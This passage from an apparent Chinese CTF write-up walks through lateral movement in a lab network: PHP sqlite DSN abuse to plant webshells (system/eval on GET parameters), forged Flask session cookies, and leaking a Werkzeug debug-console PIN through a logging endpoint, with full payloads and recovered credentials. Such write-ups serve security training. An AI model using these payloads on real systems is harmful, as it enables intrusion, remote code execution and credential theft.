class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session[<span class="string">&#x27;user&#x27;</span>] = <span class="string">&#x27;guest&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;log server is running&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_session</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;user&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;user&#x27;</span>] != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/key&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_key</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_session():</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;not authorized&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/log_server_key.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            key = f.read()</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;key&#x27;</span>, <span class="string">&#x27;key&#x27;</span>: key&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/set_log_option&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_log_option</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_session():</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;not authorized&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    logName = request.args.get(<span class="string">&#x27;logName&#x27;</span>)</span><br><span class="line">    logFile = request.args.get(<span class="string">&#x27;logFile&#x27;</span>)</span><br><span class="line">    app_log = logging.getLogger(logName)</span><br><span class="line">    app_log.addHandler(logging.FileHandler(<span class="string">&#x27;./log/&#x27;</span> + logFile))</span><br><span class="line">    app_log.setLevel(logging.INFO)</span><br><span class="line">    clear_log_file(<span class="string">&#x27;./log/&#x27;</span> + logFile)</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;log option set successfully&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/get_log_content&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_log_content</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_session():</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;not authorized&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    logFile = request.args.get(<span class="string">&#x27;logFile&#x27;</span>)</span><br><span class="line">    path = join(<span class="string">&#x27;log&#x27;</span>, basename(logFile))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.read()</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;log content&#x27;</span>, <span class="string">&#x27;content&#x27;</span>: content&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clear_log_file</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8888</span>)</span><br></pre></td></tr></table></figure><p>读了也没很大的用处。题目是横向渗透，之前给了一个内网ip 172.2.233.4，莫非是扫c段？</p><p>我勒个豆？？随便改了一位直接出了。。。环境变了一次，所以172.2.233.4变为172.2.45.4</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101191643733.png" class="" title="This is an example image"><h2 id="第三章"><a href="#第三章" class="headerlink" title="第三章"></a>第三章</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">跳岛战术</span><br><span class="line">拿到config.php中的数据库密码</span><br></pre></td></tr></table></figure><p>跳岛战术，被困了好久</p><p>8888端口开放了一个flask的服务</p><p>然后看看php代码</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250107152415587.png" class="" title="This is an example image"><p>这台机器是php环境，config.php估计就在这台机子上了。</p><p>GET传参，四个参数，username、password、dsn、query</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?username=meteorkai&amp;password=mateorkai&amp;dsn=sqlite:aa.php&amp;query=CREATE TABLE bad (name TEXT);</span><br><span class="line"></span><br><span class="line">%3Fusername%3Dmeteorkai%26password%3Dmateorkai%26dsn%3Dsqlite%3Aaa.php%26query%3DCREATE%20TABLE%20bad%20%28name%20TEXT%29%3B</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?username=meteorkai&amp;password=mateorkai&amp;dsn=sqlite:aa.php&amp;query=INSERT INTO bad (name) VALUES (&#x27;&lt;?php file_put_contents(&quot;cmd.php&quot;,&quot;&lt;?php system(\$_GET[0]);?&gt;&quot;);?&gt;&#x27;);</span><br><span class="line"></span><br><span class="line">%3Fusername%3Dmeteorkai%26password%3Dmateorkai%26dsn%3Dsqlite%3Aaa.php%26query%3DINSERT%20INTO%20bad%20%28name%29%20VALUES%20%28%27%3C%3Fphp%20file_put_contents%28%22cmd.php%22%2C%22%3C%3Fphp%20system%28%5C%24_GET%5B0%5D%29%3B%3F%3E%22%29%3B%3F%3E%27%29%3B</span><br><span class="line"></span><br><span class="line">%3fdsn=sqlite:shell.php%26username=aaa%26password=bbb%26query=create%20table%20&quot;aaa&quot;%20(name%20TEXT%20DEFAULT%20&quot;&lt;?php%20file_put_contents(&#x27;1.php&#x27;,&#x27;&lt;?php eval($_GET[1]);?&gt;&#x27;);?&gt;&quot;);</span><br></pre></td></tr></table></figure><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250107163450520.png" class="" title="This is an example image"><p>sqlite的每一个数据库其实都是一个文件，第一个命令是创建一个bad表并有字段name，这会被记录到php文件中去。第二个命令相当于往name字段写入一个后门，那么就会在php文件中出现，然后我们访问aa.php，就会触发php代码，从而产生后门</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250107165825230.png" class="" title="This is an example image"><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250107165902352.png" alt="image-20250107165902352" style="zoom:80%;" /><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250107165902352.png" class="" title="This is an example image"><p>成功获得config.php中数据库密码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$database_host = &quot;localhost&quot;;</span><br><span class="line">$database_user = &quot;root&quot;;</span><br><span class="line">$database_password = &quot;3f7a1d5a-d55d-4d9d-8d9a-d5d5d5d5d5d5&quot;;</span><br><span class="line">$database_name = &quot;web_db_2&quot;;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">提交park在2024年12月27日19时20分收到的邮件中的数字</span><br><span class="line"></span><br><span class="line">格式 ctfshow&#123;数字&#125;</span><br><span class="line"></span><br><span class="line">也可以提交 163邮箱的账号密码 格式 ctfshow&#123;账号_密码&#125;</span><br></pre></td></tr></table></figure><p>然后我们看看根目录，发现存在一个secret.txt文件，查看一下。</p><p>获得一串base64编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">YUdGamEyVnlYMk4wWm5Ob2IzZEFNVFl6TG1OdmJTOUk=</span><br><span class="line">WVdOclpYSmZZM1JtYzJnd2R3PT0=</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aGFja2VyX2N0ZnNob3dAMTYzLmNvbS9I</span><br><span class="line">YWNrZXJfY3Rmc2gwdw==</span><br></pre></td></tr></table></figure><p>解码后拼接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hacker_ctfshow@163.com/Hacker_ctfsh0w</span><br></pre></td></tr></table></figure><p>邮箱号加密码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;hacker_ctfshow@163.com_Hacker_ctfsh0w&#125;</span><br></pre></td></tr></table></figure><h2 id="第四章"><a href="#第四章" class="headerlink" title="第四章"></a>第四章</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">提交log_server_key.txt内容</span><br></pre></td></tr></table></figure><p>本章的重点是flask服务器，之前我们看到过源码，在8888端口</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250107165937711.png" class="" title="This is an example image"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify, session</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> url_for, redirect</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">from</span> os.path <span class="keyword">import</span> basename, join</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;3f7a4d5a-a71a-4d9d-8d9a-d5d5d5d5d5d5&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session[<span class="string">&#x27;user&#x27;</span>] = <span class="string">&#x27;guest&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;log server is running&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_session</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;user&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;user&#x27;</span>] != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/key&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_key</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_session():</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;not authorized&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/log_server_key.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            key = f.read()</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;key&#x27;</span>, <span class="string">&#x27;key&#x27;</span>: key&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/set_log_option&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_log_option</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_session():</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;not authorized&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    logName = request.args.get(<span class="string">&#x27;logName&#x27;</span>)</span><br><span class="line">    logFile = request.args.get(<span class="string">&#x27;logFile&#x27;</span>)</span><br><span class="line">    app_log = logging.getLogger(logName)</span><br><span class="line">    app_log.addHandler(logging.FileHandler(<span class="string">&#x27;./log/&#x27;</span> + logFile))</span><br><span class="line">    app_log.setLevel(logging.INFO)</span><br><span class="line">    clear_log_file(<span class="string">&#x27;./log/&#x27;</span> + logFile)</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;log option set successfully&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/get_log_content&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_log_content</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_session():</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;not authorized&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    logFile = request.args.get(<span class="string">&#x27;logFile&#x27;</span>)</span><br><span class="line">    path = join(<span class="string">&#x27;log&#x27;</span>, basename(logFile))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.read()</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;log content&#x27;</span>, <span class="string">&#x27;content&#x27;</span>: content&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clear_log_file</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8888</span>)</span><br></pre></td></tr></table></figure><p>这里我们获取到了一个session值，看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ1c2VyIjoiZ3Vlc3QifQ.Z3zuOw.FYFsUkqCVKObwblDG85AR5G7PRI</span><br></pre></td></tr></table></figure><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250107170758420.png" class="" title="This is an example image"><p>第一题我们的重点是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/key&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_key</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_session():</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;not authorized&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/log_server_key.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            key = f.read()</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;key&#x27;</span>, <span class="string">&#x27;key&#x27;</span>: key&#125;</span><br></pre></td></tr></table></figure><p>那就是session伪造嘛。</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250107171222896.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ1c2VyIjoiYWRtaW4ifQ.Z3zvxA.3ctTGQeEHdsYY66hbZKoftfwOLg</span><br></pre></td></tr></table></figure><p>然后我们需要携带cookie访问&#x2F;key路由</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://172.2.78.5/cmd.php?0=curl+http://172.2.78.6:8888/key+--cookie+&quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z3zvxA.3ctTGQeEHdsYY66hbZKoftfwOLg&quot;</span><br></pre></td></tr></table></figure><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250107172121397.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">提交flask所在服务器的/etc/passwd 文件最后一行内容</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/set_log_option&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_log_option</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_session():</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;not authorized&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    logName = request.args.get(<span class="string">&#x27;logName&#x27;</span>)</span><br><span class="line">    logFile = request.args.get(<span class="string">&#x27;logFile&#x27;</span>)</span><br><span class="line">    app_log = logging.getLogger(logName)</span><br><span class="line">    app_log.addHandler(logging.FileHandler(<span class="string">&#x27;./log/&#x27;</span> + logFile))</span><br><span class="line">    app_log.setLevel(logging.INFO)</span><br><span class="line">    clear_log_file(<span class="string">&#x27;./log/&#x27;</span> + logFile)</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;log option set successfully&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/get_log_content&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_log_content</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_session():</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;not authorized&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    logFile = request.args.get(<span class="string">&#x27;logFile&#x27;</span>)</span><br><span class="line">    path = join(<span class="string">&#x27;log&#x27;</span>, basename(logFile))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.read()</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;log content&#x27;</span>, <span class="string">&#x27;content&#x27;</span>: content&#125;</span><br></pre></td></tr></table></figure><p>这里打pin码泄露，创建一个日志，然后把pin码打印到日志。</p><p>设置loggername为werkzeug记录flask的日志（不知道的可以打个断点看一下，在logdict里有）</p><p><img src="https://img2024.cnblogs.com/blog/3392505/202501/3392505-20250106215946821-295044882.png" alt="img"></p><p>查一下就可以知道这个logger可以记录flask的日志，那么打印出来的pin就会出现在日志中，然后getlogcontent即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#设置log</span><br><span class="line">http://172.2.95.5/1.php?1=system(&#x27;curl+-b+&quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z5NFxQ.nqry7XfiXJlZUKCcezNjKLe_wD0&quot;+&quot;http://172.2.95.6:8888/set_log_option%3flogName=werkzeug%2526logFile=jwk.log&quot;&#x27;);</span><br></pre></td></tr></table></figure><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250124161450305.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#获取console的页面key</span><br><span class="line">http://172.2.95.5/1.php?1=system(&#x27;curl+-b+&quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z5NFxQ.nqry7XfiXJlZUKCcezNjKLe_wD0&quot;+&quot;http://172.2.95.6:8888/console&quot;&#x27;);</span><br><span class="line"></span><br><span class="line">BDrrhrw6TzJCcFsCz6dj</span><br></pre></td></tr></table></figure><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250124150000597.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#打印pin码到日志</span><br><span class="line">curl -b  &quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z5NFxQ.nqry7XfiXJlZUKCcezNjKLe_wD0&quot; &quot;http://172.2.95.6:8888/console?__debugger__=yes&amp;cmd=printpin&amp;s=BDrrhrw6TzJCcFsCz6dj&quot;</span><br><span class="line"></span><br><span class="line">Y3VybCAtYiAgInNlc3Npb249ZXlKMWMyVnlJam9pWVdSdGFXNGlmUS5aNU5GeFEubnFyeTdYZmlYSmxaVUtDY2V6TmpLTGVfd0QwIiAiaHR0cDovLzE3Mi4yLjk1LjY6ODg4OC9jb25zb2xlP19fZGVidWdnZXJfXz15ZXMmY21kPXByaW50cGluJnM9QkRycmhydzZUekpDY0ZzQ3o2ZGoi</span><br></pre></td></tr></table></figure><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250124150445453.png" class="" title="This is an example image"><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250124150510020.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">读log</span><br><span class="line">curl -b  &quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z5NFxQ.nqry7XfiXJlZUKCcezNjKLe_wD0&quot; &quot;http://172.2.95.6:8888/get_log_content?logFile=jwk.log&quot;</span><br><span class="line"></span><br><span class="line">Y3VybCAtYiAgInNlc3Npb249ZXlKMWMyVnlJam9pWVdSdGFXNGlmUS5aNU5GeFEubnFyeTdYZmlYSmxaVUtDY2V6TmpLTGVfd0QwIiAiaHR0cDovLzE3Mi4yLjk1LjY6ODg4OC9nZXRfbG9nX2NvbnRlbnQ/bG9nRmlsZT1qd2subG9nIg==</span><br></pre></td></tr></table></figure><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250124162224929.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">375-828-345</span><br></pre></td></tr></table></figure><p>终于读到pin了，卡了好久。。。</p><p>然后我们pinauth一下，获取cookie</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -b  &quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z5NFxQ.nqry7XfiXJlZUKCcezNjKLe_wD0&quot; &quot;http://172.2.95.6:8888/console?__debugger__=yes&amp;cmd=pinauth&amp;pin=375-828-345&amp;s=BDrrhrw6TzJCcFsCz6dj&quot;</span><br><span class="line"></span><br><span class="line">Y3VybCAtYiAgInNlc3Npb249ZXlKMWMyVnlJam9pWVdSdGFXNGlmUS5aNU5GeFEubnFyeTdYZmlYSmxaVUtDY2V6TmpLTGVfd0QwIiAiaHR0cDovLzE3Mi4yLjk1LjY6ODg4OC9jb25zb2xlP19fZGVidWdnZXJfXz15ZXMmY21kPXBpbmF1dGgmcGluPTM3NS04MjgtMzQ1JnM9QkRycmhydzZUekpDY0ZzQ3o2ZGoi</span><br></pre></td></tr></table></figure><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250124162404620.png" class="" title="This is an example image"><p>显示auth为true，验证成功，这里我们保存cookie的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -c cookie.txt -v -b  &quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z5NFxQ.nqry7XfiXJlZUKCcezNjKLe_wD0&quot; &quot;http://172.2.95.6:8888/console?__debugger__=yes&amp;cmd=pinauth&amp;pin=375-828-345&amp;s=BDrrhrw6TzJCcFsCz6dj&quot;</span><br></pre></td></tr></table></figure><img 